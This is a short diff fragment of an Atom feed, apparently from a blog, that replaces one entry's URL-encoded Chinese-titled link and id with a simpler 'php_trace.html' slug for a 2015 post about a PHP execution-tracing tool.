-    <link href="https://www.virzz.com/2015/12/12/PHPTrace%20PHP%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E8%B7%9F%E8%B8%AA%E5%B7%A5%E5%85%B7.html"/>
-    <id>https://www.virzz.com/2015/12/12/PHPTrace PHP执行流程跟踪工具.html</id>
+    <link href="https://www.virzz.com/2015/12/12/php_trace.html"/>
+    <id>https://www.virzz.com/2015/12/12/php_trace.html</id>
     <published>2015-12-12T01:09:00.000Z</published>
     <updated>2016-12-12T06:12:03.000Z</updated>
     
